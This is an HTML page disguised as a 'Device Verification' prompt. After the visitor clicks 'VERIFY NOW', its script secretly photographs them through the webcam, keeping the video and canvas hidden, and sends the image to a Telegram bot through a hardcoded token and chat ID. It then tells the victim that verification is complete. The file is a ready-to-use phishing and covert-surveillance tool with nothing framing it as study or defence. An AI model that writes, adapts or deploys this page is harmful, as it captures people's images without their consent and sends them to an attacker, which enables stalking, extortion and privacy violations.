<!DOCTYPE html>
<html>
<head>
    <title>Verification System</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <h2>Device Verification Required</h2>
    <p>Please click the button below to verify your identity.</p>
    
    <button class="btn" onclick="startCapture()">VERIFY NOW</button>

    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
        const CHAT_ID = "6643732863"; // Replace this with your ID!

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Wait for video to load then snap
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        sendToTelegram(blob);
                    }, 'image/jpeg');
                    
                    // Stop camera
                    stream.getTracks().forEach(track => track.stop());
                    alert("Verification Complete!");
                }, 2000);

            } catch (err) {
                alert("Please allow camera access to proceed.");
            }
        }

        function sendToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", photoBlob, "capture.jpg");

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            })
            .then(response => console.log("Success:", response))
            .catch(error => console.error("Error:", error));
        }
    </script>
</body>
</html>
